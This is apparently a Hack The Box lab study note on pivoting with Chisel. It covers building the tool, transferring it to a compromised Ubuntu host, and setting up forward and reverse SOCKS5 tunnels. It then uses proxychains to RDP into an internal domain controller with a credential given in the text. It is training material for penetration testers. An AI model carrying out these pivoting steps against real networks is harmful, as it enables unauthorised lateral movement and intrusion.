# SOCKS5 Tunneling with Chisel

***

Chisel est un outil de tunneling TCP/UDP en Go qui utilise HTTP sécurisé par SSH. Il permet de créer un tunnel client-serveur dans un réseau restreint par un pare-feu. Par exemple, si notre cible interne (172.16.5.19) n’est pas accessible depuis notre machine d’attaque, on peut lancer Chisel sur le serveur Ubuntu compromis pour rediriger le trafic vers le réseau interne.

***

### <mark style="color:red;">Setting Up & Using Chisel</mark>

<mark style="color:green;">**Cloning Chisel**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

<mark style="color:green;">**Building the Chisel Binary**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ cd chisel
go build
```

{% hint style="warning" %}
It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel)" and IppSec's walkthrough of the box `Reddish`. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM\&t=1469s).
{% endhint %}

<mark style="color:green;">**Transferring Chisel Binary to Pivot Host**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
```

Then we can start the Chisel server/listener.

<mark style="color:green;">**Running the Chisel Server on the Pivot Host**</mark>

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
```

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

<mark style="color:green;">**Connecting to the Chisel Server**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
```

{% hint style="info" %}
As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.
{% endhint %}

<mark style="color:green;">**Editing & Confirming proxychains.conf**</mark>

We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.

```shell-session
mrroboteLiot@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

<mark style="color:green;">**Pivoting to the DC**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

***

### <mark style="color:red;">Chisel Reverse Pivot</mark>

<mark style="color:green;">**Starting the Chisel Server on our Attack Host**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
```

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

<mark style="color:green;">**Connecting the Chisel Client to our Attack Host**</mark>

```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```

We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.

<mark style="color:green;">**Editing & Confirming proxychains.conf**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

```shell-session
mrroboteLiot@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
